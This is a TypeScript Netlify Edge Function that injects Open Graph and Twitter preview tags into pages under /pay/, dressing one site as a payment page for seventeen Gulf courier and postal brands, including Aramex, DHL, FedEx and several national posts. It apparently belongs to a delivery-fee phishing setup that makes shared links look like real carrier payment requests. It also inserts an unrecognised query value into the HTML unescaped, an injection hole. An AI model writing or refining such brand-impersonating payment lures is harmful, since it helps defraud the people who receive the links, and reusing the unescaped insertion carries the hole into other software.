// Netlify Edge Function to inject Open Graph meta tags server-side
// This runs BEFORE JavaScript and ensures social media crawlers see correct OG tags

export default async function handler(request: Request, context: { next: () => Promise<Response> }) {
  try {
    // Get the URL and query parameters
    const url = new URL(request.url);
    const company = url.searchParams.get('company') || 'aramex';
    const path = url.pathname;

    // Only process /pay/* paths
    if (!path.startsWith('/pay/')) {
      return context.next();
    }

    console.log('OG Injector: Processing', { path, company });

    // Fetch the original HTML
    const response = await context.next();
    const html = await response.text();

    // Company to OG image mapping
    const companyImages: Record<string, string> = {
      'aramex': 'https://gulf-unified-payment.netlify.app/og/aramex.png',
      'dhl': 'https://gulf-unified-payment.netlify.app/og/dhl.png',
      'dhlkw': 'https://gulf-unified-payment.netlify.app/og/dhl.png',
      'dhlqa': 'https://gulf-unified-payment.netlify.app/og/dhl.png',
      'dhlom': 'https://gulf-unified-payment.netlify.app/og/dhl.png',
      'dhlbh': 'https://gulf-unified-payment.netlify.app/og/dhl.png',
      'fedex': 'https://gulf-unified-payment.netlify.app/og/fedex.png',
      'ups': 'https://gulf-unified-payment.netlify.app/og/ups.png',
      'empost': 'https://gulf-unified-payment.netlify.app/og/empost.png',
      'smsa': 'https://gulf-unified-payment.netlify.app/og/smsa.png',
      'zajil': 'https://gulf-unified-payment.netlify.app/og/zajil.png',
      'naqel': 'https://gulf-unified-payment.netlify.app/og/naqel.png',
      'saudipost': 'https://gulf-unified-payment.netlify.app/og/saudipost.png',
      'kwpost': 'https://gulf-unified-payment.netlify.app/og/kwpost.png',
      'qpost': 'https://gulf-unified-payment.netlify.app/og/qpost.png',
      'omanpost': 'https://gulf-unified-payment.netlify.app/og/omanpost.png',
      'bahpost': 'https://gulf-unified-payment.netlify.app/og/bahpost.png'
    };

    // Get OG image for the company, fallback to default
    const ogImage = companyImages[company.toLowerCase()] || 'https://gulf-unified-payment.netlify.app/og/default.png';

    // Company display names
    const companyNames: Record<string, string> = {
      'aramex': 'أرامكس',
      'dhl': 'دي إتش إل',
      'dhlkw': 'دي إتش إل الكويت',
      'dhlqa': 'دي إتش إل قطر',
      'dhlom': 'دي إتش إل عُمان',
      'dhlbh': 'دي إتش إل البحرين',
      'fedex': 'فيديكس',
      'ups': 'يو بي إس',
      'empost': 'البريد الإماراتي',
      'smsa': 'سمسا',
      'zajil': 'زاجل',
      'naqel': 'ناقل',
      'saudipost': 'البريد السعودي',
      'kwpost': 'البريد الكويتي',
      'qpost': 'البريد القطري',
      'omanpost': 'البريد العُماني',
      'bahpost': 'البريد البحريني'
    };

    const companyName = companyNames[company.toLowerCase()] || company;

    // Generate OG meta tags
    const ogTags = `
    <!-- Open Graph / Facebook / WhatsApp - Server Injected -->
    <meta property="og:type" content="website" />
    <meta property="og:title" content="${companyName} Payment - Complete your payment" />
    <meta property="og:description" content="Complete your payment with ${companyName} - Secure and reliable payment gateway" />
    <meta property="og:image" content="${ogImage}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/png" />
    <meta property="og:site_name" content="Gulf Payment Gateway" />
    <meta property="og:locale" content="ar_AR" />

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="${companyName} Payment - Complete your payment" />
    <meta name="twitter:description" content="Complete your payment with ${companyName} - Secure and reliable payment gateway" />
    <meta name="twitter:image" content="${ogImage}" />
    <meta name="twitter:image:alt" content="${companyName} Payment Gateway" />
    `;

    // Remove existing OG tags (if any) and inject new ones
    // This regex removes existing OG and Twitter meta tags
    let modifiedHtml = html.replace(
      /<meta\s+(?:property|name)=["']\w*og:\w*["'][^>]*>\s*/gi,
      ''
    ).replace(
      /<meta\s+name=["']twitter:\w*["'][^>]*>\s*/gi,
      ''
    );

    // Inject new OG tags after <head> tag
    modifiedHtml = modifiedHtml.replace(
      /<head[^>]*>/i,
      (match) => `${match}\n${ogTags.trim()}`
    );

    console.log('OG Injector: Injected tags for', { company, ogImage });

    // Return modified HTML with same headers
    return new Response(modifiedHtml, {
      status: response.status,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'public, max-age=0, must-revalidate',
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'SAMEORIGIN'
      }
    });

  } catch (error) {
    console.error('OG Injector Error:', error);
    // If anything goes wrong, fall back to original response
    return context.next();
  }
}
